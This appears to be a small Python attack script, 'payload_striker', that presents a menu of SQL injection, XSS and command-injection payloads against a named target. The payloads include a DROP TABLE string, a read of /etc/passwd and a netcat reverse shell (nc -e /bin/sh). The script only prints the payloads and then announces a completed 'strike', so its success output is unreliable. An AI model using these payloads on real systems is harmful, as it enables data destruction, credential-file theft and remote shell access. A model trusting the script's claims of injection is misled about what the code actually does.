import os
import sys
import time
from colorama import Fore, Style, init

init(autoreset=True)

def strike_payload(target, p_type):
    print(f"\n{Fore.RED}[!] STRIKING TARGET: {target}")
    print(f"{Fore.YELLOW}[*] Selecting Payload Category: {p_type}")
    
    # Payload Database
    payloads = {
        "SQLi": ["' OR 1=1 --", "'; DROP TABLE users; --", "admin'--"],
        "XSS": ["<script>alert('XPACKET')</script>", "<img src=x onerror=alert(1)>"],
        "RCE": ["; ls -la", "&& cat /etc/passwd", "| nc -e /bin/sh 127.0.0.1 4444"]
    }

    if p_type in payloads:
        selected = payloads[p_type]
        for p in selected:
            print(f"{Fore.CYAN}[⚙️] Injecting: {p}")
            time.sleep(0.5)
        print(f"\n{Fore.GREEN}[✓] Strike Sequence Complete on {target}")
    else:
        print(f"{Fore.RED}[!] Error: Unknown Payload Type.")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target = sys.argv[1]
        print(f"{Fore.MAGENTA}Select Type: [1] SQLi [2] XSS [3] RCE")
        choice = input("Choice: ").strip()
        types = {"1": "SQLi", "2": "XSS", "3": "RCE"}
        strike_payload(target, types.get(choice, "SQLi"))
    else:
        print(f"{Fore.YELLOW}Usage: python3 payload_striker.py <target>")
